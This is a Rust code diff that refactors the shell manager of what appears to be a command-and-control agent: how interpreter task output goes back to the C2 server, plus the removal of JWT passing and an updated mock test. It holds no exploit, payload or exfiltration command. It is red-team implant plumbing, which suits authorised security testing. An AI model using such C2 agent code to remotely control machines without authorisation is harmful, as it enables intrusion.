@@ -8,11 +8,7 @@ use tokio::sync::mpsc;
 use eldritch::agent::agent::Agent;
 use eldritch::assets::std::EmptyAssets;
 use eldritch::{Interpreter, Printer, Span, Value};
-use eldritch_agent::Context;
-use pb::c2::{
-    ReportOutputRequest, ReportShellTaskOutputMessage, ShellTask, ShellTaskContext,
-    ShellTaskOutput, TaskError, report_output_request,
-};
+use pb::c2::{ReportTaskOutputRequest, ShellTask, ShellTaskOutput, TaskContext, TaskError};
 use pb::portal::{self, Mote, ShellPayload};
 use transport::Transport;
 
@@ -28,7 +24,7 @@ pub enum ShellManagerMessage {
 
 #[derive(Clone)]
 pub enum ExecutionContext {
-    ShellTask(ShellTaskContext),
+    Task(i64), // We only need task_id here. stream_id and seq_id are unused for C2 reporting.
     Portal {
         tx: mpsc::Sender<Mote>,
         stream_id: String,
@@ -45,39 +41,28 @@ fn dispatch_output<T: Transport + Send + Sync + 'static>(
     is_error: bool,
 ) {
     match context {
-        ExecutionContext::ShellTask(stc) => {
-            let task_error = if is_error {
-                Some(TaskError {
-                    msg: output.clone(),
-                })
-            } else {
-                None
-            };
-
-            let output_msg = ShellTaskOutput {
-                id: stc.shell_task_id,
-                output: if is_error { String::new() } else { output },
-                error: task_error,
-                exec_started_at: None,
-                exec_finished_at: None,
-            };
-
-            let req = ReportOutputRequest {
-                message: Some(report_output_request::Message::ShellTaskOutput(
-                    ReportShellTaskOutputMessage {
-                        context: Some(stc.clone()),
-                        output: Some(output_msg),
+        ExecutionContext::Task(task_id) => {
+            let req = ReportTaskOutputRequest {
+                shell_task_output: Some(ShellTaskOutput {
+                    id: *task_id,
+                    output: if is_error {
+                        String::new()
+                    } else {
+                        output.clone()
                     },
-                )),
+                    error: if is_error {
+                        Some(TaskError { msg: output })
+                    } else {
+                        None
+                    },
+                    exec_started_at: None,
+                    exec_finished_at: None,
+                }),
+                ..Default::default()
             };
-
-            if let Err(e) = agent.report_output(req) {
+            if let Err(e) = agent.report_task_output(req) {
                 #[cfg(debug_assertions)]
-                log::error!(
-                    "Failed to report shell task output {}: {}",
-                    stc.shell_task_id,
-                    e
-                );
+                log::error!("Failed to report shell task output {}: {}", task_id, e);
             }
         }
         ExecutionContext::Portal {
@@ -139,7 +124,6 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
 pub enum InterpreterCommand {
     ExecuteTask {
         task_id: i64,
-        jwt: String,
         input: String,
     },
     ExecutePortal {
@@ -196,7 +180,6 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
                 .tx
                 .send(InterpreterCommand::ExecuteTask {
                     task_id: task.id,
-                    jwt: task.jwt,
                     input: task.input,
                 })
                 .await;
@@ -251,38 +234,20 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
             context: context.clone(),
         });
 
-        let shell_task_context = ShellTaskContext {
-            shell_task_id: 0,
+        let task_context = TaskContext {
+            task_id: 0,
             jwt: String::new(),
         };
         let backend = Arc::new(EmptyAssets {});
 
         let mut interpreter = Interpreter::new_with_printer(printer)
             .with_default_libs()
-            .with_context(
-                agent.clone(),
-                Context::ShellTask(shell_task_context),
-                Vec::new(),
-                backend,
-            );
+            .with_task_context(agent.clone(), task_context, Vec::new(), backend);
 
         while let Some(cmd) = rx.blocking_recv() {
             match cmd {
-                InterpreterCommand::ExecuteTask {
-                    task_id,
-                    jwt,
-                    input,
-                } => {
-                    let stc = ShellTaskContext {
-                        shell_task_id: task_id,
-                        jwt,
-                    };
-                    *context.lock().unwrap() = ExecutionContext::ShellTask(stc.clone());
-
-                    let ctx = Context::ShellTask(stc);
-                    let backend = Arc::new(EmptyAssets {});
-                    interpreter = interpreter.with_context(agent.clone(), ctx, Vec::new(), backend);
-
+                InterpreterCommand::ExecuteTask { task_id, input, .. } => {
+                    *context.lock().unwrap() = ExecutionContext::Task(task_id);
                     Self::execute_interpret(&mut interpreter, &input, &agent, &context, shell_id);
                     *context.lock().unwrap() = ExecutionContext::None;
                 }
@@ -297,14 +262,6 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
                         stream_id,
                         seq_id,
                     };
-                    // Portal execution doesn't have a task context really, or it inherits previous?
-                    // We might want to clear context or use a dummy one.
-                    // For now keeping what it was (could be previous task's context or default).
-                    // This might be risky if code uses context (e.g. reporting credential).
-                    // Ideally Portal requests should carry context if they are to report C2 data.
-                    // But `ExecutePortal` implies executing shell command from Portal.
-                    // We'll proceed as is.
-
                     Self::execute_interpret(&mut interpreter, &input, &agent, &context, shell_id);
                     *context.lock().unwrap() = ExecutionContext::None;
                 }
@@ -375,7 +332,7 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
 mod tests {
     use super::*;
     use crate::task::TaskRegistry;
-    use pb::c2::{ReportOutputResponse, ShellTask};
+    use pb::c2::{ReportTaskOutputResponse, ShellTask};
     use pb::config::Config;
     use transport::MockTransport;
 
@@ -386,19 +343,18 @@ mod tests {
 
         let config = Config::default();
         let mut transport = MockTransport::default();
-        // We expect report_output to be called with the result "2\n" for input "1+1"
+        // We expect report_task_output to be called with the result "2\n" for input "1+1"
         transport
-            .expect_report_output()
+            .expect_report_task_output()
             .withf(|req| {
-                if let Some(report_output_request::Message::ShellTaskOutput(m)) = &req.message {
-                    if let Some(out) = &m.output {
-                        return out.output.contains("2");
-                    }
+                if let Some(out) = &req.shell_task_output {
+                    out.output.contains("2")
+                } else {
+                    false
                 }
-                false
             })
             .times(1)
-            .returning(|_| Ok(ReportOutputResponse::default()));
+            .returning(|_| Ok(ReportTaskOutputResponse::default()));
 
         let task_registry = Arc::new(TaskRegistry::new());
 
@@ -419,7 +375,6 @@ mod tests {
             input: "1+1".to_string(),
             sequence_id: 1,
             stream_id: "stream1".to_string(),
-            jwt: "test".to_string(),
         };
 
         // Send task
